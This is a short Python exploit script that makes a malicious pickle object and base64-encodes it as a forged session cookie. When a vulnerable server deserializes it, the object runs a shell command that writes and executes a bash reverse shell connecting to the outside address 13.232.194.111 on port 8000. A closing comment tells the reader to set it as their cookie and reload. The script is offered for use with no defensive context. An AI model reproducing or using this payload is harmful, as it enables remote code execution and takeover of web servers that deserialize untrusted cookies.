import pickle
import os
import base64
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "bash -i >& /dev/tcp/13.232.194.111/8000 0>&1" > /tmp/test && bash /tmp/test', ))

pickle_data = pickle.dumps(EvilPickle()) 
session_cookie = base64.b64encode(pickle_data)

# Set this as your session cookie, reload and Voila!
